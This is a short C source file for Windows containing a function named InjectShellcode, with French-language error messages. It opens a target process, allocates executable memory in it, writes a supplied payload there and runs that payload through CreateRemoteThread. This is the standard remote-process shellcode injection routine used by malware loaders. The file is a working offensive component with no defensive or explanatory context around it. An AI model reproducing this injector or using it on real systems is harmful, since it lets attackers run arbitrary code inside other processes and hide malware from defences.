#include <windows.h>
#include <stdio.h>
#include "inject.h"



BOOL InjectShellcode(LPVOID payload, SIZE_T payloadSize, DWORD processId) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        printf("Échec. Code d'erreur: %lu\n", GetLastError());
        return FALSE;
    }

    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        printf("Erreur VirtualAllocEx: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteMemory, payload, payloadSize, &bytesWritten)) {
        printf("Erreur WriteProcessMemory: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("Erreur CreateRemoteThread: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    //VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    //CloseHandle(hThread);
    //CloseHandle(hProcess);

    return TRUE;
}
